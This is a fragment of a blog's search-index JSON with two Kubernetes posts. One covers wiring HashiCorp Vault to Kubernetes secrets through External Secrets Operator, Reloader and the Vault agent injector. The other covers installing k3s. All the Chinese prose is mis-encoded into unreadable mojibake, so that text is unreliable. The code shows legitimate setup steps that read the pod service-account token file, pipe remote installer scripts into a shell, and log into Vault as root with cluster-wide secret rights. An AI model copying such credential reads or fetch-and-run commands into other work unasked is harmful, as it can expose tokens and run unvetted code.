-\u0026gt; rolebinding é‚£kubernetesä¼šæŠŠpodä¸­saçš„Tokenæ³¨å…¥åˆ°æ–‡ä»¶ï¼š/var/run/secrets/kubernetes.io/serviceaccount/token\né‚£è°ƒç”¨k8s apiä¸­çš„token revieweræ˜¯å¯ä»¥å¯¹Tokenä»¤ç‰Œè¿›è¡ŒéªŒè¯çš„ï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ç³»åˆ—k82èµ„æº\n--- apiVersion: v1 kind: ServiceAccount metadata: name: external-secrets-sa namespace: external-secrets --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: external-secrets-clusterrole rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;, \u0026#34;delete\u0026#34;] - apiGroups: [\u0026#34;authorization.k8s.io\u0026#34;] resources: [\u0026#34;selfsubjectrulesreviews\u0026#34;] verbs: [\u0026#34;create\u0026#34;] --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: external-secrets-clusterrolebinding subjects: - kind: ServiceAccount name: external-secrets-sa namespace: external-secrets roleRef: kind: ClusterRole name: external-secrets-clusterrole apiGroup: rbac.authorization.k8s.io å¦‚ä¸Šï¼Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªsaï¼Œç„¶åæœ‰api groupçš„æƒé™ï¼ŒåŒæ—¶æˆäºˆäº†æ•´ä¸ªé›†ç¾¤çº§åˆ«çš„æƒé™\nä¸‰ã€ç™»å½•vaultï¼Œé…ç½®vaultä½¿ç”¨k8sçš„è®¤è¯æ–¹å¼è¿›è¡Œèº«ä»½è®¤è¯ é‚£ enable kubernetes å…¶å®è®¾ç½®äº† vault å¯ä»¥ä½¿ç”¨kubernetesçš„è®¤è¯æ–¹å¼æ¥è¿›è¡Œvault-roleè§’è‰²çš„èº«ä»½è®¤è¯\n# è¿›å…¥å®¹å™¨ kubectl exec -it vault-0 -- /bin/sh # ç™»å½•ï¼Œè¦è¾“å…¥çš„tokenå¯ä»¥ä»æ—¥å¿—é‡Œçœ‹åˆ° vault login root # å¼€å¯kubernetesè®¤è¯æ–¹å¼ vault auth enable kubernetes # æ¯ä¸ªpodé‡Œé¢éƒ½æœ‰saï¼Œk8sä¼šå°†è¿™ä¸ªsaçš„tokenæ³¨å…¥åˆ°æ–‡ä»¶/var/run/secrets/kubernetes.io/serviceaccount/token # é‚£å°±ç”¨è¿™ä¸ªsaçš„tokenï¼Œè°ƒç”¨k8s token_reviewerè¿›è¡Œèº«ä»½è®¤è¯ # è®¤è¯é€šè¿‡vaultå°±ä¼šé¢å‘ä¸€ä¸ªå¯¹åº”vault-roleçš„vault-tokenä»¤ç‰Œå‡ºæ¥ # ç”¨vault-tokenå°±å¯ä»¥å»vaulté‡Œè¯»å–åˆ°vault-secretçš„å†…å®¹äº† vault write auth/kubernetes/config \\ token_reviewer_jwt=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # æ‹¿tokençš„å¦ä¸€ç§æ–¹æ³•ï¼š # kubectl get secret $(kubectl get serviceaccount external-secrets-sa -o jsonpath=\u0026#34;{.secrets[0].name}\u0026#34;) -o jsonpath=\u0026#34;{.data.token}\u0026#34; | base64 --decode # vaultçš„è®¤è¯ä½“ç³»è·ŸAWSä¸€æ · # å…ˆå»ºpolicyï¼Œåå»ºrole # æ‰€ä»¥å…ˆå»ºä¸€ä¸ªè¯»secretçš„ç­–ç•¥ vault policy write external-secrets-policy - \u0026lt;\u0026lt;EOF path \u0026#34;secret/data/*\u0026#34; { capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] } EOF # ç„¶åå»ºç«‹ä¸€ä¸ªvaultçš„roleï¼Œå°†è¿™ä¸ªvault-roleç»‘å®šåˆ°k8sçš„saè´¦å·ä¸Š # é‚£k8s token reviewè®¤è¯é€šè¿‡å°±å¯ä»¥è·å¾—ç›¸åº”vault-roleçš„æƒé™ vault write auth/kubernetes/role/external-secrets-operator \\ bound_service_account_names=external-secrets-sa \\ bound_service_account_namespaces=external-secrets \\ policies=external-secrets-policy \\ ttl=24h # æ”¾æ•°æ®è¿›å»vault vault kv put secret/my-app MY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; vault kv get secret/my-app å››ã€external-secretåŒæ­¥çš„è®¾å®š external-secretç›¸å½“äºä¸­é—´äººï¼Œä»–æœ‰å¾ˆå¤šè‡ªå®šä¹‰çš„èµ„æºï¼Œæ¥è‡ªåŠ¨è¿›è¡Œvault-secretå’Œk8s-secretä¹‹é—´çš„åŒæ­¥\nClusterSecretStoreæŒ‡å®šäº†vault serverã€vault-roleã€k8s saçš„å…³ç³»\n--- apiVersion: external-secrets.io/v1 kind: ClusterSecretStore metadata: name: vault-cluster-secretstore spec: provider: vault: server: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # è¯·æ ¹æ®ä½ çš„vaultæœåŠ¡åœ°å€è°ƒæ•´ path: \u0026#34;secret\u0026#34; # KVå¼•æ“æŒ‚è½½è·¯å¾„ï¼Œä¸ä½ vault kv putå‘½ä»¤ä¸­è·¯å¾„å¯¹åº” version: \u0026#34;v2\u0026#34; # KVç‰ˆæœ¬ä¸ºv2 auth: kubernetes: mountPath: \u0026#34;kubernetes\u0026#34; # ä½ å¯ç”¨çš„k8s authè·¯å¾„ role: \u0026#34;external-secrets-operator\u0026#34; # ä½ åœ¨vaultä¸­åˆ›å»ºçš„roleåç§° serviceAccountRef: name: external-secrets-sa # ä½ ä¸ºESOåˆ›å»ºçš„ServiceAccountåç§° namespace: external-secrets # ServiceAccountæ‰€åœ¨å‘½åç©ºé—´ ExternalSecret æŒ‡å®šäº†åˆ©ç”¨vault-roleè·å¾—äº†vault-secretï¼Œæ”¾ç½®åˆ°æœ€ç»ˆè¦ç”¨åˆ°çš„k8s-secretä¸­\næ³¨æ„æœ‰åˆ·æ–°ï¼Œæ¯å°æ—¶ä¼šåˆ·æ–°ä¸€æ¬¡çš„\n--- apiVersion: external-secrets.io/v1 kind: ExternalSecret metadata: name: demo-external-secret namespace: default spec: refreshInterval: 1h secretStoreRef: name: vault-cluster-secretstore kind: ClusterSecretStore target: name: demo-secret creationPolicy: Owner data: - secretKey: MY_SECRET_NAME remoteRef: key: my-app property: MY_SECRET_NAME # Vaultä¸­å…·ä½“çš„é”®å é€šè¿‡ä»¥ä¸Šä¸¤ä¸ªèµ„æºï¼Œé‚£vaulté‡Œå­˜æ”¾çš„secretå°±è¢«åŒæ­¥åˆ°k8sçš„secretä¸­äº†\näº”ã€å®é™…éƒ¨ç½²ä¸€ä¸ªåº”ç”¨çœ‹çœ‹ é‚£æˆ‘ä»¬éšä¾¿èµ·ä¸ªdeployment\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default # ä½¿ç”¨ç›®æ ‡å‘½åç©ºé—´ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä½ çš„å®é™…å‘½åç©ºé—´ labels: app: demo spec: replicas: 1 # å‰¯æœ¬æ•°é‡ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ selector: matchLabels: app: my-app template: metadata: labels: app: my-app spec: containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent # å¦‚æœæœ¬åœ°å·²ç»å­˜åœ¨é•œåƒåˆ™ä¸æ‹‰å– ports: - containerPort: 8080 # å®¹å™¨æš´éœ²çš„ç«¯å£ env: - name: MY_SECRET_NAME valueFrom: secretKeyRef: name: demo-secret # å¼•ç”¨çš„ Secret åç§° key: MY_SECRET_NAME # Secret ä¸­çš„é”®å --- apiVersion: v1 kind: Secret metadata: name: demo-secret namespace: default # ä½¿ç”¨ç›®æ ‡å‘½åç©ºé—´ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä½ çš„å®é™…å‘½åç©ºé—´ type: Opaque data: MY_SECRET_NAME: AABBCC å®åœ¨å¤ªå¤æ‚ç—›è‹¦äº†ï¼Œæœ€ç»ˆçš„ç¯å¢ƒå˜é‡åº”è¯¥å¦‚ä¸‹ï¼š\nMY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; ä½†è¿™æ²¡æœ‰ç»“æŸå‘¢ã€‚\nå…­ã€å®‰è£…é…ç½®reloaderè‡ªåŠ¨è½®æ¢ å¦‚æœsecretè¢«æ”¹äº†ï¼Œå¦‚AKçš„Secretè‡ªåŠ¨è½®æ¢äº†ï¼Œé‚£podä¹Ÿå¿…é¡»è·Ÿç€è‡ªåŠ¨é‡å¯ä»¥åŠ è½½æ–°çš„å˜é‡\n# å®‰è£…reloader kubectl apply -f https://raw.githubusercontent.com/stakater/Reloader/master/deployments/kubernetes/reloader.yaml åœ¨deployä¸­containerçš„éƒ¨åˆ†æ–°å¢annotations:\nmetadata: annotations: reloader.stakater.com/auto: \u0026#34;true\u0026#34; å¦‚ä¸‹ï¼š\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default annotations: reloader.stakater.com/auto: \u0026#34;true\u0026#34; labels: app: demo spec: replicas: 1 # å‰¯æœ¬æ•°é‡ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ selector: matchLabels: app: my-app template: metadata: labels: app: my-app spec: containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent # å¦‚æœæœ¬åœ°å·²ç»å­˜åœ¨é•œåƒåˆ™ä¸æ‹‰å– ports: - containerPort: 80 env: - name: MY_SECRET_NAME valueFrom: secretKeyRef: name: demo-secret # å¼•ç”¨çš„ Secret åç§° key: MY_SECRET_NAME # Secret ä¸­çš„é”®å è¿™æ ·ENVç¯å¢ƒå˜é‡æ”¹å˜çš„æ—¶å€™å°±å¯ä»¥è‡ªåŠ¨é‡èµ·pod\nä¸ƒã€å¦ä¸€ç§æ³¨å…¥å¼çš„åšæ³•vault injector Deploymentæ–°å¢annotations:\nmetadata: annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end -}} å®Œæ•´å¦‚ä¸‹ï¼š\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end }} spec: replicas: 1 selector: matchLabels: app: my-app template: metadata: labels: app: my-app annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end }} spec: serviceAccountName: demo-sa containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent ports: - containerPort: 80 å¦‚ä¸Šä¹Ÿå¯ä»¥åšåˆ°secretæœ‰æ”¹åŠ¨ï¼Œå°±è‡ªåŠ¨é‡å¯\nå…«ã€è¡¥å…¨ä¸€ä¸‹ç”¨k8s Tokenå‡­æ®éªŒè¯vaultè§’è‰²çš„è¿‡ç¨‹ # å…ˆå»ºç«‹ä¸€ä¸ªSA apiVersion: v1 kind: ServiceAccount metadata: name: demo-sa namespace: default # ç„¶åå®šä¹‰ä¸€ä¸ªDeploymentï¼Œåœ¨specé™„ä¸Šè¿™ä¸ªSA --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: nginx name: nginx namespace: default spec: serviceAccountName: demo-sa replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - env: - name: VAULT_ADDR value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # æ›¿æ¢ä¸º Vault çš„æœåŠ¡åœ°å€ image: nginx:latest imagePullPolicy: IfNotPresent name: nginx # ç™»å½•vaultæœåŠ¡ï¼ˆå¼€å‘æ¨¡å¼ï¼Œç™»å½•ç”¨æˆ·æ˜¯rootï¼‰ vault login root # å¯ç”¨ Kubernetes Auth æ¨¡å¼ vault auth enable kubernetes # vault ä½¿ç”¨ sa Tokenè¿›è¡Œèº«ä»½è¯†åˆ« vault write auth/kubernetes/config \\ token_reviewer_jwt=\u0026#34;$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # åˆ›å»ºä¸€ä¸ªpolicy vault policy write demo-policy - \u0026lt;\u0026lt;EOF path \u0026#34;secret/data/*\u0026#34; { capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] } EOF # åˆ›å»ºä¸€ä¸ªvault-roleï¼Œç»‘å®šåˆ°sa vault write auth/kubernetes/role/demo-role \\ bound_service_account_names=demo-sa \\ bound_service_account_namespaces=default \\ policies=demo-policy \\ # å­˜æ”¾æµ‹è¯•kvæ•°æ® vault kv put secret/demo MY_SECRET_NAME=\u0026#34;BBCCDDEE\u0026#34; vault kv get secret/demo # å¯åŠ¨ä¸€ä¸ªdeployment --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: nginx name: nginx namespace: default spec: serviceAccountName: demo-sa replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - env: - name: VAULT_ADDR value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # æ›¿æ¢ä¸º Vault çš„æœåŠ¡åœ°å€ image: nginx:latest imagePullPolicy: IfNotPresent name: nginx # è¿›å…¥deploymentçš„podä¸­ kubectl exec -it nginx -- /bin/sh # æ‹¿åˆ°æœ¬åœ°saçš„Token export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) # æ³¨æ„podé‡Œæœ‰ç¯å¢ƒå˜é‡VAULT_ADDRï¼Œå¦‚æœæ²¡æœ‰è¦å®šä¹‰ä¸€ä¸‹ # ç„¶åç”¨curlæ‹¿vault-token curl -X POST \u0026#34;${VAULT_ADDR}/v1/auth/kubernetes/login\u0026#34; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;role\u0026#34;: \u0026#34;demo-role\u0026#34;, \u0026#34;jwt\u0026#34;: \u0026#34;\u0026#39;$TOKEN\u0026#39;\u0026#34; }\u0026#39; # curl è¿”å›å­—ç¬¦ä¸²ä¸­çš„ client_token å­—æ®µ export VAULT_TOKEN=\u0026#34;hvs.CAESaaaBBBcccDDDEEEfffGGG\u0026#34; # ç”¨vault_tokenè·å¾—kvçš„æ•°æ® curl -X GET \u0026#34;${VAULT_ADDR}/v1/secret/data/demo\u0026#34; -H \u0026#34;X-Vault-Token: $VAULT_TOKEN\u0026#34; æ‰€ä»¥ï¼Œå…¶å®vaultæœ‰apiæ¥å£ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨curlæ¥è®¤è¯å¹¶è·å–æ•°æ®ï¼Œè¿™å°±æå¤§çš„æ‰©å±•äº†vaultçš„æ¥å£èŒƒå›´ã€‚\nå¥½äº†ï¼Œå°±åˆ°è¿™é‡Œå§ï¼\n","permalink":"https://rendoumi.com/posts/20250815-vault_k8s/","summary":"\u003ch3 id=\"ä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥å¤§å™©è€—å•Š\"\u003eä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥ï¼Œå¤§å™©è€—å•Šï¼š\u003c/h3\u003e\n\u003ch2 id=\"external-secrets--external-secrets\"\u003eexternal-secrets / external-secrets\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/external-secrets/external-secrets\"\u003eLink\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eâ­ 5416 | ğŸ”€ 1032 | Go 97.6%\u003c/p\u003e\n\u003ch3 id=\"external-secrets-operator-é¡¹ç›®æš‚åœå‘å¸ƒ\"\u003eExternal Secrets Operator é¡¹ç›®æš‚åœå‘å¸ƒ\u003c/h3\u003e\n\u003cp\u003eç”±äºç»´æŠ¤å›¢é˜Ÿè§„æ¨¡è¿‡å°ï¼ŒExternal Secrets Operator å†³å®šæš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼Œç›´åˆ°é‡å»ºè¶³å¤Ÿçš„ç»´æŠ¤å›¢é˜Ÿã€‚\u003c/p\u003e\n\u003ch4 id=\"key-takeaways\"\u003eKey Takeaways\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eé¡¹ç›®æš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼ŒåŒ…æ‹¬æ–°åŠŸèƒ½ã€è¡¥ä¸å’Œå®¹å™¨é•œåƒã€‚\u003c/li\u003e\n\u003cli\u003eå°†ç»§ç»­å®¡æ ¸å’Œåˆå¹¶ç¤¾åŒºçš„ PRï¼Œä½†ä¸ä¼šæä¾› GitHub Discussionsã€Slack æˆ–é—®é¢˜è¯„è®ºçš„æ”¯æŒã€‚\u003c/li\u003e\n\u003cli\u003eéœ€è¦è‡³å°‘äº”åé•¿æœŸç»´æŠ¤è€…æ¥ç¡®ä¿é¡¹ç›®çš„å¯æŒç»­å‘å±•ã€‚\u003c/li\u003e\n\u003cli\u003eé¼“åŠ±ä¾èµ–è¯¥é¡¹ç›®çš„å…¬å¸æˆ–å›¢é˜Ÿç§¯æå‚ä¸è´¡çŒ®ã€‚\u003c/li\u003e\n\u003cli\u003eè´¡çŒ®è€…å¯é€šè¿‡å¡«å†™è¡¨å•æˆ–æŸ¥çœ‹æ²»ç†æ–‡æ¡£åŠ å…¥é¡¹ç›®ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå±…ç„¶æš‚åœå‘å¸ƒäº†ï¼Œé‚£å°±æŠ“ç´§æ—¶é—´æŠŠVaultè·Ÿå®ƒçš„é›†æˆè®°å½•ä¸‹æ¥ï¼š\u003c/p\u003e\n\u003ch3 id=\"ä¸€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…vaultç„¶åå®‰è£…external--secretséƒ½ç”¨helmè£…å³å¯\"\u003eä¸€ã€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…Vaultï¼Œç„¶åå®‰è£…external -secretsï¼Œéƒ½ç”¨helmè£…å³å¯\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add hashicorp https://helm.releases.hashicorp.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install vault hashicorp/vault --set \u003cspan class=\"s2\"\u003e\u0026#34;server.dev.enabled=true\u0026#34;\u003c/span\u003e --set \u003cspan class=\"s2\"\u003e\u0026#34;injector.enabled=true\u0026#34;\u003c/span\u003e --namespace default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add external-secrets https://charts.external-secrets.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set \u003cspan class=\"nv\"\u003einstallCRDs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"äºŒk8sæˆæƒk8çš„æˆæƒä½“ç³»å°±æ˜¯-sa---role---rolebinding\"\u003eäºŒã€k8sæˆæƒï¼Œk8çš„æˆæƒä½“ç³»å°±æ˜¯ sa -\u0026gt; role -\u0026gt; rolebinding\u003c/h3\u003e\n\u003cp\u003eé‚£kubernetesä¼šæŠŠpodä¸­saçš„Tokenæ³¨å…¥åˆ°æ–‡ä»¶ï¼š\u003ccode\u003e/var/run/secrets/kubernetes.io/serviceaccount/token\u003c/code\u003e\u003c/p\u003e","title":"vaultä½¿ç”¨external secretç®¡ç†kubernetes secret"},{"content":"è¿™ç¯‡æ˜¯ä¸€ä¸ªå¤§æ°´è´´ï¼Œåªæ˜¯ä¸ºäº†è®°å½•k3sçš„å®‰è£…\nè¿™ä¸ªä¸œè¥¿è¢«Rancherç”¨å¾—çº¯ç†Ÿï¼Œå…ˆæ­å»ºä¸€ä¸ªk3sé›†ç¾¤ï¼Œç„¶åå†å…¶ä¸Šè£…æ§åˆ¶è½¯ä»¶ï¼Œå†å»æ§åˆ¶å…¶å®ƒé›†ç¾¤ï¼Œéå¸¸å¥½çš„æƒ³æ³•ï¼Œå€¼å¾—å€Ÿé‰´\nå®‰è£…å’Œåˆ é™¤éƒ½éå¸¸ç®€æ´ï¼Œå‡†å¤‡å·¥ä½œï¼š\napt update \u0026amp;\u0026amp; apt upgrade -y # ä¸‰å°æœºå™¨åˆ†åˆ«è®¾ç½® hostnamectl set-hostname master hostnamectl set-hostname worker-1 hostnamectl set-hostname worker-2 # vi /etc/hosts 127.0.0.1 master # ä¸¤å¤–ä¸¤å°ä¹Ÿåˆ†åˆ«è®¾ç½® 127.0.0.1 worker-1 # ç¬¬3å° 127.0.0.1 worker-2 å‡†å¤‡å·¥ä½œéƒ½å¼„å¥½äº†ã€‚ä¸‹é¢å®‰è£…\ncurl -sfL https://get.k3s.io | sh - systemctl status k3s cat /var/lib/rancher/k3s/server/node-token # åŠ å…¥æ–°èŠ‚ç‚¹ curl -sfL https://get.k3s.io | K3S_URL=https://192.168.0.200:6443 K3S_TOKEN=\u0026lt;your-token-here\u0026gt; INSTALL_K3S_EXEC=\u0026#34;--node-ip=\u0026lt;worker-ip\u0026gt;\u0026#34; sh - åˆ é™¤ä¹Ÿå°±ä¸€å¥\n/usr/local/bin/k3s-uninstall.sh å¯ä»¥åå¤è¿›è¡Œå®‰è£…\n","permalink":"https://rendoumi.com/posts/20250808-k3s_install/","summary":"\u003cp\u003eè¿™ç¯‡æ˜¯ä¸€ä¸ªå¤§æ°´è´´ï¼Œåªæ˜¯ä¸ºäº†è®°å½•k3sçš„å®‰è£…\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªä¸œè¥¿è¢«Rancherç”¨å¾—çº¯ç†Ÿï¼Œå…ˆæ­å»ºä¸€ä¸ªk3sé›†ç¾¤ï¼Œç„¶åå†å…¶ä¸Šè£…æ§åˆ¶è½¯ä»¶ï¼Œå†å»æ§åˆ¶å…¶å®ƒé›†ç¾¤ï¼Œéå¸¸å¥½çš„æƒ³æ³•ï¼Œå€¼å¾—å€Ÿé‰´\u003c/p\u003e\n\u003cp\u003eå®‰è£…å’Œåˆ é™¤éƒ½éå¸¸ç®€æ´ï¼Œå‡†å¤‡å·¥ä½œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apt upgrade -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä¸‰å°æœºå™¨åˆ†åˆ«è®¾ç½®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname master\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname worker-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname worker-2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/hosts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 master\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä¸¤å¤–ä¸¤å°ä¹Ÿåˆ†åˆ«è®¾ç½®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 worker-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¬¬3å°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 worker-2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‡†å¤‡å·¥ä½œéƒ½å¼„å¥½äº†ã€‚ä¸‹é¢å®‰è£…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -sfL https://get.k3s.io \u003cspan class=\"p\"\u003e|\u003c/span\u003e sh -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl status k3s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /var/lib/rancher/k3s/server/node-token\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åŠ å…¥æ–°èŠ‚ç‚¹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -sfL https://get.k3s.io \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nv\"\u003eK3S_URL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://192.168.0.200:6443 \u003cspan class=\"nv\"\u003eK3S_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026lt;your-token-here\u0026gt; \u003cspan class=\"nv\"\u003eINSTALL_K3S_EXEC\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--node-ip=\u0026lt;worker-ip\u0026gt;\u0026#34;\u003c/span\u003e sh -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåˆ é™¤ä¹Ÿå°±ä¸€å¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan 